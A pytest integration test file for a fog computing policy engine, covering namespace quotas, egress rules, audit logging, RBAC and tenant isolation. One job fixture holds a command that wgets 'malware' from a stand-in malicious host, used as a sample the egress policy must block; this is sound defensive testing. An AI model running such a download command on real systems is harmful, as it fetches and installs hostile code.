"""
Integration tests for namespace quota enforcement

Tests the fog computing security policy that enforces namespace quotas
according to Task 3 acceptance criteria:
- Job without namespace or over quota → 403
"""

from unittest.mock import patch

import pytest

from packages.core.security.rbac_system import RBACSystem, Role
from packages.fog.gateway.security.policy import EgressPolicy, FogSecurityPolicyEngine, NamespaceQuota


@pytest.fixture
async def policy_engine():
    """Create policy engine for testing"""
    engine = FogSecurityPolicyEngine()
    await engine.initialize()
    return engine


@pytest.fixture
async def rbac_system():
    """Create RBAC system for testing"""
    rbac = RBACSystem()

    # Create test tenant and users
    tenant = await rbac.create_tenant(
        name="Test Org", admin_user={"username": "admin", "email": "admin@test.com", "password": "test123"}
    )

    user = await rbac.create_user(
        username="testuser", email="user@test.com", password="test123", tenant_id=tenant.tenant_id, role=Role.USER  # nosec B106
    )

    return rbac, tenant, user


@pytest.fixture
def sample_job_specs():
    """Sample job specifications for testing"""
    return {
        "valid_job": {
            "image": "alpine:latest",
            "command": ["echo", "hello"],
            "resources": {"cpu": "100m", "memory": "128Mi"},
            "env": {"LOG_LEVEL": "INFO"},
        },
        "oversized_job": {
            "image": "ubuntu:latest",
            "command": ["./large_app"],
            "resources": {"cpu": "4000m", "memory": "8Gi"},  # 4 cores  # 8GB
        },
        "network_job": {
            "image": "curlimages/curl:latest",
            "command": ["curl", "https://api.example.com/data"],
            "resources": {"cpu": "100m", "memory": "64Mi"},
            "networking": {"egress": {"allowed_destinations": ["api.example.com"]}},
        },
        "malicious_job": {
            "image": "alpine:latest",
            "command": ["wget", "http://malicious-site.com/malware"],
            "resources": {"cpu": "100m", "memory": "64Mi"},
        },
    }


class TestNamespaceQuotaEnforcement:
    """Test namespace quota enforcement policies"""

    @pytest.mark.asyncio
    async def test_job_without_namespace_rejected(self, policy_engine, rbac_system, sample_job_specs):
        """Test that jobs without namespace are rejected with 403"""

        rbac, tenant, user = rbac_system

        # Configure engine to require namespace
        policy_engine.require_namespace = True

        result = await policy_engine.validate_job_submission(
            namespace=None,  # No namespace provided
            job_spec=sample_job_specs["valid_job"],
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        # Should be rejected per acceptance criteria
        assert result["allowed"] is False
        assert result["http_status"] == 403
        assert "namespace" in result["reason"].lower()
        assert len(result["violations"]) >= 1

        violation = result["violations"][0]
        assert violation["type"] == "NAMESPACE_REQUIRED"
        assert violation["severity"] == "HIGH"

    @pytest.mark.asyncio
    async def test_job_with_valid_namespace_allowed(self, policy_engine, rbac_system, sample_job_specs):
        """Test that jobs with valid namespace are allowed"""

        rbac, tenant, user = rbac_system

        # Set up namespace quota
        namespace = f"{tenant.tenant_id}_test"
        quota = NamespaceQuota(
            namespace=namespace, max_concurrent_jobs=10, max_cpu_cores=8, max_memory_gb=16, max_storage_gb=100
        )
        policy_engine.namespace_quotas[namespace] = quota

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["valid_job"],
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        assert result["allowed"] is True
        assert len(result["violations"]) == 0
        assert result["namespace"] == namespace

    @pytest.mark.asyncio
    async def test_job_over_cpu_quota_rejected(self, policy_engine, rbac_system, sample_job_specs):
        """Test that jobs exceeding CPU quota are rejected with 403"""

        rbac, tenant, user = rbac_system

        # Set up low CPU quota
        namespace = f"{tenant.tenant_id}_limited"
        quota = NamespaceQuota(
            namespace=namespace,
            max_concurrent_jobs=10,
            max_cpu_cores=2,  # Low limit
            max_memory_gb=16,
            max_storage_gb=100,
        )
        policy_engine.namespace_quotas[namespace] = quota

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["oversized_job"],  # Requests 4 cores
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        # Should be rejected per acceptance criteria
        assert result["allowed"] is False
        assert result["http_status"] == 403
        assert "quota" in result["reason"].lower()

        # Check for quota violation
        quota_violations = [v for v in result["violations"] if v["type"] == "QUOTA_EXCEEDED"]
        assert len(quota_violations) >= 1

        violation = quota_violations[0]
        assert "cpu" in violation["resource"].lower()
        assert violation["requested"] > violation["available"]

    @pytest.mark.asyncio
    async def test_job_over_memory_quota_rejected(self, policy_engine, rbac_system, sample_job_specs):
        """Test that jobs exceeding memory quota are rejected"""

        rbac, tenant, user = rbac_system

        # Set up low memory quota
        namespace = f"{tenant.tenant_id}_memory_limited"
        quota = NamespaceQuota(
            namespace=namespace,
            max_concurrent_jobs=10,
            max_cpu_cores=8,
            max_memory_gb=4,  # Low limit
            max_storage_gb=100,
        )
        policy_engine.namespace_quotas[namespace] = quota

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["oversized_job"],  # Requests 8GB
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        assert result["allowed"] is False
        assert result["http_status"] == 403

        # Check for memory quota violation
        quota_violations = [v for v in result["violations"] if v["type"] == "QUOTA_EXCEEDED"]
        memory_violations = [v for v in quota_violations if "memory" in v["resource"].lower()]
        assert len(memory_violations) >= 1

    @pytest.mark.asyncio
    async def test_concurrent_jobs_quota_enforced(self, policy_engine, rbac_system, sample_job_specs):
        """Test that concurrent jobs quota is enforced"""

        rbac, tenant, user = rbac_system

        # Set up low concurrent jobs quota
        namespace = f"{tenant.tenant_id}_concurrent_limited"
        quota = NamespaceQuota(
            namespace=namespace,
            max_concurrent_jobs=2,  # Very low limit
            max_cpu_cores=8,
            max_memory_gb=16,
            max_storage_gb=100,
        )
        policy_engine.namespace_quotas[namespace] = quota

        # Simulate existing running jobs
        quota.current_concurrent_jobs = 2  # At limit

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["valid_job"],
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        assert result["allowed"] is False
        assert result["http_status"] == 403

        # Check for concurrent jobs violation
        quota_violations = [v for v in result["violations"] if v["type"] == "QUOTA_EXCEEDED"]
        concurrent_violations = [v for v in quota_violations if "concurrent" in v["resource"].lower()]
        assert len(concurrent_violations) >= 1

    @pytest.mark.asyncio
    async def test_namespace_not_found_rejected(self, policy_engine, rbac_system, sample_job_specs):
        """Test that jobs for non-existent namespaces are rejected"""

        rbac, tenant, user = rbac_system

        result = await policy_engine.validate_job_submission(
            namespace="nonexistent_namespace",
            job_spec=sample_job_specs["valid_job"],
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        assert result["allowed"] is False
        assert result["http_status"] == 403
        assert "namespace" in result["reason"].lower() or "not found" in result["reason"].lower()

    @pytest.mark.asyncio
    async def test_quota_consumption_tracking(self, policy_engine, rbac_system, sample_job_specs):
        """Test that quota consumption is properly tracked"""

        rbac, tenant, user = rbac_system

        namespace = f"{tenant.tenant_id}_tracking"
        quota = NamespaceQuota(
            namespace=namespace, max_concurrent_jobs=10, max_cpu_cores=8, max_memory_gb=16, max_storage_gb=100
        )
        policy_engine.namespace_quotas[namespace] = quota

        # Submit valid job
        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["valid_job"],
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        assert result["allowed"] is True

        # Check quota tracking
        assert "quota_status" in result
        quota_status = result["quota_status"]
        assert quota_status["namespace"] == namespace
        assert quota_status["cpu_utilization"] >= 0
        assert quota_status["memory_utilization"] >= 0
        assert quota_status["jobs_utilization"] >= 0

    @pytest.mark.asyncio
    async def test_admin_bypass_quota_limits(self, policy_engine, rbac_system, sample_job_specs):
        """Test that admin users can bypass certain quota limits"""

        rbac, tenant, user = rbac_system

        # Create admin user
        admin = await rbac.create_user(
            username="admin_user",
            email="admin@test.com",
            password="admin123",  # nosec B106 - test password
            tenant_id=tenant.tenant_id,
            role=Role.ADMIN,
        )

        # Set up very restrictive quota
        namespace = f"{tenant.tenant_id}_admin_test"
        quota = NamespaceQuota(
            namespace=namespace, max_concurrent_jobs=1, max_cpu_cores=1, max_memory_gb=1, max_storage_gb=10
        )
        policy_engine.namespace_quotas[namespace] = quota
        quota.current_concurrent_jobs = 1  # At limit

        # Admin should be able to bypass some limits
        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["valid_job"],
            user_context={"user_id": admin.user_id, "tenant_id": tenant.tenant_id, "role": admin.role.value},
        )

        # Depending on implementation, admin might be allowed or get special treatment
        if result["allowed"]:
            assert "admin_override" in result
        else:
            # Even admin should respect some limits
            assert result["http_status"] == 403


class TestEgressPolicyEnforcement:
    """Test network egress policy enforcement"""

    @pytest.mark.asyncio
    async def test_default_egress_deny(self, policy_engine, rbac_system, sample_job_specs):
        """Test that default egress policy is deny"""

        rbac, tenant, user = rbac_system

        namespace = f"{tenant.tenant_id}_egress_test"
        quota = NamespaceQuota(namespace=namespace)
        policy_engine.namespace_quotas[namespace] = quota

        # Set up default deny egress policy
        egress_policy = EgressPolicy(
            namespace=namespace, default_action="deny", allowed_destinations=set(), allowed_ports=set()
        )
        policy_engine.egress_policies[namespace] = egress_policy

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["malicious_job"],  # Tries to access external site
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        # Should detect egress violation
        egress_violations = [v for v in result["violations"] if v["type"] == "EGRESS_VIOLATION"]
        assert len(egress_violations) >= 1

        violation = egress_violations[0]
        assert "malicious-site.com" in violation["details"]["destination"]

    @pytest.mark.asyncio
    async def test_allowed_egress_destinations(self, policy_engine, rbac_system, sample_job_specs):
        """Test that explicitly allowed destinations work"""

        rbac, tenant, user = rbac_system

        namespace = f"{tenant.tenant_id}_allowed_egress"
        quota = NamespaceQuota(namespace=namespace)
        policy_engine.namespace_quotas[namespace] = quota

        # Set up egress policy with allowed destinations
        egress_policy = EgressPolicy(
            namespace=namespace,
            default_action="deny",
            allowed_destinations={"api.example.com"},
            allowed_ports={80, 443},
        )
        policy_engine.egress_policies[namespace] = egress_policy

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["network_job"],  # Accesses api.example.com
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        # Should be allowed since destination is whitelisted
        egress_violations = [v for v in result["violations"] if v["type"] == "EGRESS_VIOLATION"]
        assert len(egress_violations) == 0

    @pytest.mark.asyncio
    async def test_blocked_ports(self, policy_engine, rbac_system):
        """Test that non-allowed ports are blocked"""

        rbac, tenant, user = rbac_system

        namespace = f"{tenant.tenant_id}_port_test"
        quota = NamespaceQuota(namespace=namespace)
        policy_engine.namespace_quotas[namespace] = quota

        # Only allow standard web ports
        egress_policy = EgressPolicy(
            namespace=namespace, default_action="deny", allowed_destinations={"example.com"}, allowed_ports={80, 443}
        )
        policy_engine.egress_policies[namespace] = egress_policy

        # Job trying to use non-standard port
        ssh_job = {
            "image": "alpine:latest",
            "command": ["ssh", "user@example.com"],
            "resources": {"cpu": "100m", "memory": "64Mi"},
        }

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=ssh_job,
            user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
        )

        # Should detect port violation (SSH uses port 22)
        egress_violations = [v for v in result["violations"] if v["type"] == "EGRESS_VIOLATION"]
        assert len(egress_violations) >= 1


class TestSecurityViolationLogging:
    """Test security violation logging and audit trails"""

    @pytest.mark.asyncio
    async def test_violation_audit_logging(self, policy_engine, rbac_system, sample_job_specs):
        """Test that security violations are properly logged"""

        rbac, tenant, user = rbac_system

        # Mock the audit logging
        with patch.object(policy_engine, "_log_security_event") as mock_log:
            await policy_engine.validate_job_submission(
                namespace=None,  # Violation: no namespace
                job_spec=sample_job_specs["valid_job"],
                user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
            )

            # Should have logged the violation
            mock_log.assert_called()

            # Check the logged event
            call_args = mock_log.call_args[1]
            assert call_args["event_type"] == "job_validation_failed"
            assert call_args["user_id"] == user.user_id
            assert call_args["tenant_id"] == tenant.tenant_id
            assert "violations" in call_args["details"]

    @pytest.mark.asyncio
    async def test_security_metrics_collection(self, policy_engine, rbac_system, sample_job_specs):
        """Test that security metrics are collected"""

        rbac, tenant, user = rbac_system

        # Submit several jobs with different outcomes
        test_cases = [
            (None, sample_job_specs["valid_job"], False),  # No namespace
            (f"{tenant.tenant_id}_test", sample_job_specs["valid_job"], True),  # Valid
            (f"{tenant.tenant_id}_test", sample_job_specs["oversized_job"], False),  # Over quota
        ]

        for namespace, job_spec, should_pass in test_cases:
            if namespace and should_pass:
                # Set up quota for valid test
                quota = NamespaceQuota(namespace=namespace)
                policy_engine.namespace_quotas[namespace] = quota

            await policy_engine.validate_job_submission(
                namespace=namespace,
                job_spec=job_spec,
                user_context={"user_id": user.user_id, "tenant_id": tenant.tenant_id, "role": user.role.value},
            )

        # Get security metrics
        metrics = policy_engine.get_security_metrics()

        assert metrics["total_job_validations"] >= 3
        assert metrics["violations_detected"] >= 2
        assert metrics["blocked_jobs"] >= 2
        assert "violation_types" in metrics
        assert "namespace_violations" in metrics["violation_types"]


class TestIntegrationWithRBAC:
    """Test integration between quota enforcement and RBAC"""

    @pytest.mark.asyncio
    async def test_rbac_permission_integration(self, policy_engine, rbac_system, sample_job_specs):
        """Test that RBAC permissions are checked during quota validation"""

        rbac, tenant, user = rbac_system

        # Create user without fog job submit permission
        limited_user = await rbac.create_user(
            username="limited",
            email="limited@test.com",
            password="test123",  # nosec B106 - test password
            tenant_id=tenant.tenant_id,
            role=Role.GUEST,  # Guest has limited permissions
        )

        namespace = f"{tenant.tenant_id}_rbac_test"
        quota = NamespaceQuota(namespace=namespace)
        policy_engine.namespace_quotas[namespace] = quota

        # Link RBAC system to policy engine
        policy_engine.rbac_system = rbac

        result = await policy_engine.validate_job_submission(
            namespace=namespace,
            job_spec=sample_job_specs["valid_job"],
            user_context={
                "user_id": limited_user.user_id,
                "tenant_id": tenant.tenant_id,
                "role": limited_user.role.value,
            },
        )

        # Should be rejected due to lack of FOG_JOB_SUBMIT permission
        assert result["allowed"] is False
        assert result["http_status"] == 403

        # Check for permission violation
        perm_violations = [v for v in result["violations"] if v["type"] == "PERMISSION_DENIED"]
        assert len(perm_violations) >= 1

    @pytest.mark.asyncio
    async def test_tenant_isolation(self, policy_engine, rbac_system, sample_job_specs):
        """Test that tenant isolation is enforced"""

        rbac, tenant1, user1 = rbac_system

        # Create second tenant
        tenant2 = await rbac.create_tenant(
            name="Other Org", admin_user={"username": "admin2", "email": "admin2@other.com", "password": "test123"}
        )

        user2 = await rbac.create_user(
            username="user2", email="user2@other.com", password="test123", tenant_id=tenant2.tenant_id, role=Role.USER  # nosec B106
        )

        # Set up namespace for tenant1
        namespace1 = f"{tenant1.tenant_id}_private"
        quota1 = NamespaceQuota(namespace=namespace1)
        policy_engine.namespace_quotas[namespace1] = quota1

        # User from tenant2 tries to use tenant1's namespace
        result = await policy_engine.validate_job_submission(
            namespace=namespace1,
            job_spec=sample_job_specs["valid_job"],
            user_context={
                "user_id": user2.user_id,
                "tenant_id": tenant2.tenant_id,  # Different tenant
                "role": user2.role.value,
            },
        )

        # Should be rejected due to tenant isolation
        assert result["allowed"] is False
        assert result["http_status"] == 403

        # Check for tenant isolation violation
        isolation_violations = [v for v in result["violations"] if v["type"] == "TENANT_ISOLATION"]
        assert len(isolation_violations) >= 1


if __name__ == "__main__":
    # Run tests
    pytest.main([__file__, "-v"])
